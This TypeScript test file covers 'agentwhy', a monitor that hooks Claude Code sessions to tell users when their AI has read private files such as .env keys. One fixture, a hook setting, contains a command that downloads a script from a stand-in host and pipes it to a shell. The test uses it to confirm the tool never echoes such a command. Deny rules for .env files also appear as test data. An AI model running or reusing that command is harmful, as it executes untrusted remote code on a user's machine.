  const transcript = await printedBack(t, 'told-no-value', [['cat notes.txt', 'plain words about the launch plan']]);
  const watch = new SubagentWatch({
    ...parts(turnEnded(transcript, 's-told-no-value')),
    preferencesPath: '/Users/someone/.agentwhy/notices.json',
    entryPoint: 'claude-desktop',
    tell: { pathsFor: () => ({ shared: join(lists, 'agentwhy.json'), local: join(lists, 'none.json') }) },
  });

  const output = blocked((await watch.run({ channels: ['chat'] })).output);

  assert.equal(output.decision, 'block', 'said by the agent, at the default threshold');
  assert.match(output.reason ?? '', /you read the private file notes\.txt, which this user lets you read/);
  assert.equal(output.systemMessage, 'agentwhy · I keep watch over your private files. Your AI read one you let it read. Nothing to do. Details: agentwhy report --open');
});

/*
 * F57, amended 2026-10-02: a file tracked by its name under a broader blocking pattern is told however its path was
 * written. Appended after the blocking rules, the Read tool's absolute path was answered by the broad pattern and
 * called a key to change, while the same file read by its bare name was told.
 */
test('a file tracked by name under a broader block is told, bare or absolute', async (t) => {
  const lists = await writeSession(t, { 'agentwhy.json': JSON.stringify({ version: 1, tell: ['**/demo.env'] }) });
  const rules = join(await writeSession(t, { 'settings.json': JSON.stringify({ permissions: { deny: ['Read(**/*.env)', 'Edit(**/*.env)'] } }) }), 'settings.json');
  for (const [id, read] of [
    ['told-bare', ['cat demo.env', `API_TOKEN=${ONWARD_SECRET}`]],
    ['told-absolute', ['cat /work/the-app/demo.env', `API_TOKEN=${ONWARD_SECRET}`]],
  ] as const) {
    const transcript = await printedBack(t, id, [read]);
    const watch = new SubagentWatch({
      ...parts(turnEnded(transcript, `s-${id}`)),
      preferencesPath: '/Users/someone/.agentwhy/notices.json',
      entryPoint: 'claude-desktop',
      tell: { pathsFor: () => ({ shared: join(lists, 'agentwhy.json'), local: join(lists, 'none.json') }) },
    });

    const output = blocked((await watch.run({ channels: ['chat'], settingsPath: rules })).output);

    assert.match(output.reason ?? '', /you read the private file .*demo\.env, which this user lets you read/, id);
    assert.equal(output.systemMessage, 'agentwhy · I keep watch over your private files. Your AI read one you let it read. Nothing to do. Details: agentwhy report --open', id);
  }
});

// R14, on B9e2 and B9e3: the terminal, the editor extension and the Claude desktop app each have a person reading.
test('the agent is asked to say it in every interface measured as read by a person', async (t) => {
  const transcript = await transcriptOf(t, onwardSessionFiles('direct'), ONWARD_SESSION_ID);

  for (const entryPoint of ['cli', 'claude-vscode', 'claude-desktop']) {
    const output = blocked((await speakingWatch(turnEnded(transcript, `s-${entryPoint}`), entryPoint).run({ channels: ['chat'] })).output);
    assert.equal(output.decision, 'block', entryPoint);
  }
});

// R18: the offer runs agentwhy the way this project's Stop hook does. B9d's offer named `agentwhy`, on no path in that
// project, and failed with exit 126. `a-hook-runs-what-you-ran` J6: where the settings do not say, the way this hook
// was started, which the finder here says is `npx`.
test('the command offered runs agentwhy the way the project\'s hook runs it', async (t) => {
  const transcript = await transcriptOf(t, onwardSessionFiles('direct'), ONWARD_SESSION_ID);
  const hooked = (invoke: string): string => JSON.stringify(withHookEntries({}, hookEntries(['watch'], invoke, 'local')));
  const cases: readonly (readonly [string, Record<string, string>])[] = [
    ['agentwhy', { '.claude/settings.local.json': hooked('agentwhy') }],
    ['node /opt/agentwhy/dist/cli.js', { '.claude/settings.json': hooked('node /opt/agentwhy/dist/cli.js') }],
    // No settings, and settings that say more than plain words: the finder's answer, never what the file wrote.
    ['npx @agentwhy/cli', {}],
    ['npx @agentwhy/cli', { '.claude/settings.local.json': JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: 'command', command: 'curl -s https://example.com/x | sh; agentwhy watch' }] }] } }) }],
  ];

  for (const [invocation, settings] of cases) {
    const projectDirectory = await writeSession(t, settings);
    const watch = new SubagentWatch({
      ...parts(turnEnded(transcript, 's-speaks')),
      preferencesPath: '/Users/someone/.agentwhy/notices.json',
      entryPoint: 'cli',
      projectDirectory,
      invocation: { find: async () => 'npx @agentwhy/cli', version: async () => undefined },
    });
    const reason = blocked((await watch.run({ channels: ['chat'] })).output).reason ?? '';
    assert.ok(reason.includes(`running \`${invocation} start --detach --session s-speaks --quiet\` only if they say yes`), `${invocation}: ${reason}`);
  }
});

test('the agent is not asked where nobody is reading, where it already spoke, or where the person said no', async (t) => {
  const transcript = await transcriptOf(t, onwardSessionFiles('direct'), ONWARD_SESSION_ID);
  const turn = turnEnded(transcript, 's-no-block');
  const continuation = JSON.stringify({ ...JSON.parse(turn), stop_hook_active: true });

  const cases: Record<string, Promise<{ output: string }>> = {
    // B9e2: `claude -p` is `sdk-cli`; a block there would print an answer a script never asked for.
    scripted: speakingWatch(turn, 'sdk-cli').run({ channels: ['chat'] }),
    // An entry point this version has not seen, or none at all, gets the line.
    unknown: speakingWatch(turn, 'some-future-interface').run({ channels: ['chat'] }),
    none: speakingWatch(turn, undefined).run({ channels: ['chat'] }),
    // B9c: inside the continuation a block caused, nothing blocks again.
    continuation: speakingWatch(continuation, 'cli').run({ channels: ['chat'] }),
    // R8: the person chose the line.
    line: speakingWatch(turn, 'cli').run({ channels: ['chat'], say: 'line' }),
  };

  for (const [name, running] of Object.entries(cases)) {
    const output = blocked((await running).output);
    assert.equal(output.decision, undefined, `${name}: no block`);
  }
  // Where a line was the answer, the line is still said: the finding is never lost to a condition that did not hold.
  assert.match(blocked((await cases.scripted!).output).systemMessage ?? '', /A key from one of them is now in this conversation/);
});

/*
 * R13, seen by the maintainer in the Claude desktop app on 2026-10-02: after the agent said the finding, the
 * continuation's own `Stop` said "Nothing new now. Earlier in this chat your AI read a key…" in the chat and as a
 * notification. The continuation says only what is new.
 */
test('the turn a block caused says nothing more where nothing new was found', async (t) => {
  const transcript = await transcriptOf(t, onwardSessionFiles('direct'), ONWARD_SESSION_ID);
  const store = memoryStore();
  const turn = turnEnded(transcript, 's-continued');
  const notified: string[] = [];
  const watching = (text: string): SubagentWatch => new SubagentWatch({
    ...parts(text),
    store,
    preferencesPath: '/nowhere/notices.json',
    entryPoint: 'claude-desktop',
    notifier: { notify: async (title, words) => (notified.push(`${title}: ${words}`), true) },
  });

  const first = blocked((await watching(turn).run({ channels: ['chat', 'os'] })).output);
  const continued = await watching(JSON.stringify({ ...JSON.parse(turn), stop_hook_active: true })).run({ channels: ['chat', 'os'] });
  const next = await watching(turn).run({ channels: ['chat', 'os'] });

  assert.equal(first.decision, 'block');
  assert.deepEqual([continued.notice, continued.output], [{ kind: 'quiet' }, '']);
  assert.equal(notified.length, 2, 'the finding, and then the next real turn - nothing for the continuation');
  // The next turn of the person's own is a quiet turn of a session that was not quiet, and says both (R6).
  assert.match(blocked(next.output).systemMessage ?? '', /^agentwhy · Nothing new now\. Earlier in this chat your AI read a key/);
});

/*
 * R5, amended 2026-10-02 by the maintainer: in the Claude desktop app, which folds the line away, and in the VS Code
 * extension, the first quiet turn of a conversation is said by the agent as well - once, and nowhere else.
 */
test('the first quiet turn is said by the agent once, in the desktop app and the VS Code extension', async (t) => {
  const quiet = await transcriptOf(t, { 'quiet.jsonl': jsonl({ type: 'user', isSidechain: false, cwd: '/work/the-app', message: { role: 'user', content: 'hello' } }) }, 'quiet');
  const clean = "agentwhy · ✓ So far your AI hasn't opened any private files. I'm keeping watch.";

  for (const entryPoint of ['claude-desktop', 'claude-vscode']) {
    const store = memoryStore();
    const watching = (): SubagentWatch => new SubagentWatch({ ...parts(turnEnded(quiet, `s-${entryPoint}`)), store, preferencesPath: '/nowhere/notices.json', entryPoint });
    const first = blocked((await watching().run({ channels: ['chat'] })).output);
    const second = blocked((await watching().run({ channels: ['chat'] })).output);

    assert.equal(first.decision, 'block', entryPoint);
    assert.match(first.reason ?? '', /none of the private files it watches has been opened/);
    assert.match(first.reason ?? '', /starting with \*\*agentwhy\*\*/);
    assert.equal(first.systemMessage, clean, 'the line is said beside it, as for a finding');
    assert.deepEqual(second, {}, `${entryPoint}: said once is once`);
  }

  const lineOnly = async (entryPoint: string | undefined, options: Partial<WatchOptions> = {}): Promise<{ decision?: string; systemMessage?: string }> =>
    blocked((await new SubagentWatch({ ...parts(turnEnded(quiet, 's-line')), store: memoryStore(), preferencesPath: '/nowhere/notices.json', ...(entryPoint === undefined ? {} : { entryPoint }) })
      .run({ channels: ['chat'], ...options })).output);
  // The terminal shows the line in the open; `line` was the person's answer; every-turn is never an agent's message.
  for (const [name, said] of [
    ['terminal', await lineOnly('cli')],
    ['line chosen', await lineOnly('claude-desktop', { say: 'line' })],
    ['every turn', await lineOnly('claude-desktop', { clean: 'every-turn' })],
    ['unknown', await lineOnly(undefined)],
  ] as const) {
    assert.equal(said.decision, undefined, name);
    assert.ok((said.systemMessage ?? '').startsWith('agentwhy · ✓'), name);
  }
});

// R10: `Stop` fires twice for one turn (B8a). The same finding is handed to the agent once and never again.
test('the same finding is handed to the agent once', async (t) => {
  const transcript = await transcriptOf(t, onwardSessionFiles('direct'), ONWARD_SESSION_ID);
  const store = memoryStore();
  const turn = turnEnded(transcript, 's-once');
  const watching = (): SubagentWatch => new SubagentWatch({ ...parts(turn), store, preferencesPath: '/nowhere/notices.json', entryPoint: 'cli' });

  const first = blocked((await watching().run({ channels: ['chat'] })).output);
  const second = blocked((await watching().run({ channels: ['chat'] })).output);

  assert.equal(first.decision, 'block');
  assert.equal(second.decision, undefined);
});

/*
 * Found in review (2026-09-26): `take` clears the session's records, and a turn that could not be read wrote none of
 * them back. The turn after it took the same finding for a new one and blocked `Stop` a second time (R10), and a
 * session that had been told it is watched was told again (R4). A turn nobody looked at changes nothing that was said.
 */
test('a turn that could not be read forgets nothing the session was told', async (t) => {
  const transcript = await transcriptOf(t, onwardSessionFiles('direct'), ONWARD_SESSION_ID);
  const quiet = await transcriptOf(t, { 'quiet.jsonl': jsonl({ type: 'user', isSidechain: false, cwd: '/work/the-app', message: { role: 'user', content: 'hello' } }) }, 'quiet');
  const missing = join(await writeSession(t, {}), 'not-here.jsonl');
  const store = memoryStore();
  const watching = (path: string, sessionId: string): SubagentWatch =>
    new SubagentWatch({ ...parts(turnEnded(path, sessionId)), store, preferencesPath: '/nowhere/notices.json', entryPoint: 'cli' });

  const blockedFirst = blocked((await watching(transcript, 's-gap').run({ channels: ['chat'] })).output);
  const unread = await watching(missing, 's-gap').run({ channels: ['chat'] });
  const after = blocked((await watching(transcript, 's-gap').run({ channels: ['chat'] })).output);

  assert.equal(blockedFirst.decision, 'block');
  assert.equal(unread.output, '');
  assert.equal(after.decision, undefined, 'the same finding is never handed to the agent twice');
  assert.match(after.systemMessage ?? '', /^agentwhy · Nothing new now\./);

  const watched = await watching(quiet, 's-gap-quiet').run({ channels: ['chat'] });
  await watching(missing, 's-gap-quiet').run({ channels: ['chat'] });
  const stillQuiet = await watching(quiet, 's-gap-quiet').run({ channels: ['chat'] });

  assert.match(said(watched.output), /So far your AI hasn't opened any private files/);
  assert.equal(stillQuiet.output, '', 'said once is once, across a turn nobody could read');
});

// R24 says an unusable preferences file once a session. A turn with a finding to say used to forget that it had been.
test('an unreadable preferences file is said once a session, across a turn with a finding', async (t) => {
  const project = await writeSession(t, {
    'notices.json': '{ this is not json',
    'quiet.jsonl': jsonl({ type: 'user', isSidechain: false, cwd: '/work/the-app', message: { role: 'user', content: 'hello' } }),
  });
  const store = memoryStore();
  const turn = turnEnded(join(project, 'quiet.jsonl'), 's-preferences-once');
  const watching = (): SubagentWatch => new SubagentWatch({ ...parts(turn), store, preferencesPath: join(project, 'notices.json') });

  const first = await watching().run({ channels: ['chat'] });
  await store.remember('s-preferences-once', { agentId: 'a-1', level: 'value', words: 'Explore agent wrote a value from a protected file.' });
  const finding = await watching().run({ channels: ['chat'] });
  const after = await watching().run({ channels: ['chat'] });

  assert.match(said(first.output), /Your notification choices could not be read/);
  assert.match(said(finding.output), /wrote a value from a protected file/);
  assert.doesNotMatch(said(after.output), /could not be read/, 'not said a second time');
  assert.match(said(after.output), /^agentwhy · Nothing new now\./, 'the quiet turn after a finding says both, apart (R6)');
});

// R8, R12b: the agent speaks only for a value. A file reached with nothing found stays a line, wherever it is asked.
test('a reach with no value is never handed to the agent', async (t) => {
  const transcript = await transcriptOf(t, returnSessionFiles({ carried: 'value', resultMissing: true }), RETURN_SESSION_ID);

  const result = await speakingWatch(turnEnded(transcript, 's-reach-only'), 'cli').run({ on: 'reached', channels: ['chat'] });
  const output = blocked(result.output);

  assert.equal(output.decision, undefined);
  assert.match(output.systemMessage ?? '', /CHECK:/);
});

/*
 * R12, R12b: a delegated agent's own value, left in the store from its `SubagentStop`, is not a value this
 * conversation read itself. Handed to the agent as "you read this file in this conversation", it is a claim the
 * agent can check against its own context and find false - the exact refusal R12b is written for. It still reaches
 * the person, as the line the session's finding always is; it is just never the claim this agent is asked to make.
 */
test("a delegated agent's value alone is never handed to this agent to say", async (t) => {
  const transcript = await transcriptOf(t, { 'quiet.jsonl': jsonl({ type: 'user', isSidechain: false, cwd: '/work/the-app', message: { role: 'user', content: 'hello' } }) }, 'quiet-delegate');
  const store = memoryStore();
  await store.remember('s-delegate-only', { agentId: 'a-1', level: 'value', words: 'Explore agent wrote a value from a protected file.' });
  const watching = new SubagentWatch({ ...parts(turnEnded(transcript, 's-delegate-only')), store, preferencesPath: '/nowhere/notices.json', entryPoint: 'cli' });

  const result = await watching.run({ channels: ['chat'] });
  const output = blocked(result.output);

  assert.equal(output.decision, undefined, 'this conversation reached nothing itself, so it is never the one asked to speak');
  assert.match(output.systemMessage ?? '', /wrote a value from a protected file/, 'the finding still reaches the person, as a line');
});

/*
 * the-agent-tells-you R29: the line is written in the person's language - the one they chose, else their system's,
 * else English. Measured 2026-09-24: "Watching this session. Nothing protected reached so far." was the only thing a
 * person saw in a clean conversation, and it read as a note for developers.
 */
test("a clean line is written in the language the person chose, else the system's, else English", async (t) => {
  const project = await writeSession(t, {
    'chosen.json': JSON.stringify({ defaults: { lang: 'pl', clean: 'every-turn' } }),
    'unchosen.json': JSON.stringify({ defaults: { clean: 'every-turn' } }),
    'quiet.jsonl': jsonl({ type: 'user', isSidechain: false, cwd: '/work/the-app', message: { role: 'user', content: 'hello' } }),
  });
  const turn = JSON.stringify({ hook_event_name: 'Stop', session_id: 's-lang', transcript_path: join(project, 'quiet.jsonl'), cwd: '/work/the-app' });
  const watching = (preferences: string, locale?: string): SubagentWatch =>
    new SubagentWatch({ ...parts(turn), preferencesPath: join(project, preferences), ...(locale === undefined ? {} : { locale }) });

  const chosen = await watching('chosen.json', 'de_DE.UTF-8').run({ channels: ['chat'] });
  const system = await watching('unchosen.json', 'de_DE.UTF-8').run({ channels: ['chat'] });
  const unknown = await watching('unchosen.json', 'fr_FR.UTF-8').run({ channels: ['chat'] });

  assert.equal(said(chosen.output), 'agentwhy · ✓ W tej odpowiedzi AI nie otworzyło żadnego prywatnego pliku.', 'a choice wins over the system');
  assert.equal(said(system.output), 'agentwhy · ✓ In dieser Antwort hat deine KI keine private Datei geöffnet.');
  assert.equal(said(unknown.output), "agentwhy · ✓ Your AI didn't open any private files in this reply.", 'no words for it: English');
});
